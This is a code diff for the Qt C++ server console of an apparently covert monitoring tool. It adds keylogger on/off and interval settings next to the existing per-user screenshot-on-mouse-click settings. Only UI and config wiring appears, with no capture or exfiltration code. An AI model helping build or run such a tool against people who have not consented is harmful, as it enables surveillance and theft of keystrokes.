@@ -17,11 +17,15 @@ Server::Server(QWidget *parent, const QString& defaultPath, quint16 _port) :
     ui->buttonFileDialog->setEnabled(false);
     ui->buttonSaveConfig->setEnabled(false);
     ui->buttonSendConfig->setEnabled(false);
+    //Screenshot
     ui->spinSeconds->setEnabled(false);
     ui->checkLMB->setEnabled(false);
     ui->checkRMB->setEnabled(false);
     ui->checkMMB->setEnabled(false);
     ui->checkMWH->setEnabled(false);
+    //Keylogger
+    ui->checkOnOff->setEnabled(false);
+    ui->spinSeconds2->setEnabled(false);
 
     loadUsers();
 
@@ -37,13 +41,12 @@ Server::Server(QWidget *parent, const QString& defaultPath, quint16 _port) :
     uiMapper->addMapping(ui->checkRMB, 4);
     uiMapper->addMapping(ui->checkMMB, 5);
     uiMapper->addMapping(ui->checkMWH, 6);
+    uiMapper->addMapping(ui->checkOnOff, 7);
+    uiMapper->addMapping(ui->spinSeconds2, 8);
 
     //Hide model items in tree view
-    ui->treeUsers->setColumnHidden(2, true);
-    ui->treeUsers->setColumnHidden(3, true);
-    ui->treeUsers->setColumnHidden(4, true);
-    ui->treeUsers->setColumnHidden(5, true);
-    ui->treeUsers->setColumnHidden(6, true);
+    for (int i=2; i<=8; ++i)
+        ui->treeUsers->setColumnHidden(i, true);
 
     connect(ui->treeUsers->selectionModel(), &QItemSelectionModel::currentRowChanged,
             [this](const QModelIndex& current, const QModelIndex&  /* previous */ ) {
@@ -59,6 +62,8 @@ Server::Server(QWidget *parent, const QString& defaultPath, quint16 _port) :
                     ui->checkRMB->setEnabled(true);
                     ui->checkMMB->setEnabled(true);
                     ui->checkMWH->setEnabled(true);
+                    ui->checkOnOff->setEnabled(true);
+                    ui->spinSeconds2->setEnabled(true);
                     first = false;
                 }
     });
@@ -97,11 +102,13 @@ void Server::setupModels()
     //Set header names
     treeModel->setHeaderData(0, Qt::Horizontal, "username");
     treeModel->setHeaderData(1, Qt::Horizontal, "ip");
-    treeModel->setHeaderData(2, Qt::Horizontal, "seconds");
+    treeModel->setHeaderData(2, Qt::Horizontal, "secondsScreen");
     treeModel->setHeaderData(3, Qt::Horizontal, "LMB");
     treeModel->setHeaderData(4, Qt::Horizontal, "RMB");
     treeModel->setHeaderData(5, Qt::Horizontal, "MMB");
     treeModel->setHeaderData(6, Qt::Horizontal, "MWH");
+    treeModel->setHeaderData(7, Qt::Horizontal, "isLogWorking");
+    treeModel->setHeaderData(8, Qt::Horizontal, "SecondLog");
 
     //Traverse existing users and add to model
     QList<QStandardItem*> items;
@@ -143,13 +150,15 @@ void Server::initTreeModel(QList<QStandardItem*> &items,
     ipItem->setFlags(ipItem->flags() & ~Qt::ItemIsEditable);
     nameItem->setFlags(nameItem->flags() & ~Qt::ItemIsEditable);
 
-    QStandardItem* secondsItem = new QStandardItem(QString::number(cfg->seconds));
+    QStandardItem* secondsItem = new QStandardItem(QString::number(cfg->secondsScreen));
     QStandardItem* LMB = new QStandardItem(QString::number((cfg->mouseButtons >> 3 & 0x1) ? 1 : 0));
     QStandardItem* RMB = new QStandardItem(QString::number((cfg->mouseButtons >> 2 & 0x1) ? 1 : 0));
     QStandardItem* MMB = new QStandardItem(QString::number((cfg->mouseButtons >> 1 & 0x1) ? 1 : 0));
     QStandardItem* MWH = new QStandardItem(QString::number((cfg->mouseButtons & 0x1) ? 1 : 0));
+    QStandardItem* secondsLogItem = new QStandardItem(QString::number(cfg->secondsLog));
+    QStandardItem* logRunItem = new QStandardItem(cfg->logRun ? "1" : "0");
 
-    items << nameItem << ipItem << secondsItem << LMB << RMB << MMB << MWH;
+    items << nameItem << ipItem << secondsItem << LMB << RMB << MMB << MWH << logRunItem << secondsLogItem;
     treeModel->appendRow(items);
     items.clear();
 }
@@ -262,8 +271,12 @@ void Server::setConfig(Config &cfg)
         int rmb = treeModel->index(currentRow, 4).data().toBool() ? 4 : 0;
         int mmb = treeModel->index(currentRow, 5).data().toBool() ? 2 : 0;
         int mwh = treeModel->index(currentRow, 6).data().toBool() ? 1 : 0;
+        //Screenshot
         cfg.mouseButtons = lmb + rmb + mmb + mwh;
-        cfg.seconds = treeModel->index(currentRow, 2).data().toInt();
+        cfg.secondsScreen = treeModel->index(currentRow, 2).data().toInt();
+        //Keylogger
+        cfg.logRun = treeModel->index(currentRow, 7).data().toBool();
+        cfg.secondsLog = treeModel->index(currentRow, 8).data().toInt();
     }
 }
 
